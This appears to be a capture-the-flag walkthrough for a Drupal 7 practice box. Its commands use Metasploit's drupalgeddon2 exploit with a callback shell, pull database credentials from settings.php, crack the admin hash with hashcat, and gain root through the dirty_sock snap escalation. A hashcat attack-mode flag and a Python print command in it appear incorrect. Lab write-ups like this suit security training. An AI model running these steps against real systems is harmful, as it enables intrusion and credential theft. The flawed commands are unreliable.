So we're given a box, so the immediate thing to do is nmap it and see what we find. We find it has SSH open and port 80 open. Using `-sV` and `-sC` with your nmap command, you find that the HTTP server is running Drupal 7, which — if you look up vulnerabilities — gives you **drupalgeddon2** (`CVE-2018-7600`). You can use Metasploit to exploit this vulnerability. Just search for the CVE:

```bash
msfconsole
search CVE-2018-7600
use 0
set RHOSTS <target IP>
set LHOST <your IP>
run
```

and then you're in.

You should immediately drop a shell — I made the mistake of not doing that and had to deal with not having any commands available to me.

```bash
shell
/bin/bash -i
```

Now use whatever tools you want to find the Drupal config file. If you look it up online, you find that the config file should be in `/var/www/html/sites/default/settings.php`. In `settings.php`, you'll find the password to the MySQL server. Use that password and username to connect to the MySQL server **from the target box, not your own**:

```bash
mysql -u drupaluser -pPASSWORD
```

No host needs to be specified since you're running the default option localhost.

Once you're on the MySQL database, you first need to find the tables. The semicolon is important:

```sql
SHOW TABLES;
```

You get a bunch of options, but `users` is the one that seems most interesting:

```sql
select * from users;
```

You'll find brucetherealadmin's password, but it's hashed. That means you need to run some hashcat on it. If you run `hashcat -h | grep -i drupal`, you'll find that the mode you need is 7900. Put the hash in a txt file and run:

```bash
hashcat --wordlist=rockyou.txt -a 3 -m 7900 thehash.txt
```

This should get you the word `booboo`.

SSH into the machine and type in the password. You should find the `user.txt` file, which is your first flag. The second flag is found exploiting snap. If you run `sudo -l`, you can find that bruce can run snap without root privileges. You can exploit this using a **dirty_sock** PoC.

Use the `trojan_sock` found there and enclose it in Python:

```bash
python3 -c 'print "thelongtrojan"' | base64 -d > whatever.snap
sudo snap install whatever.snap --dangerous --devmode
su dirty_sock   # password is dirty_sock
```

After that just do `sudo cat /root/root.txt` and you'll have your final flag.
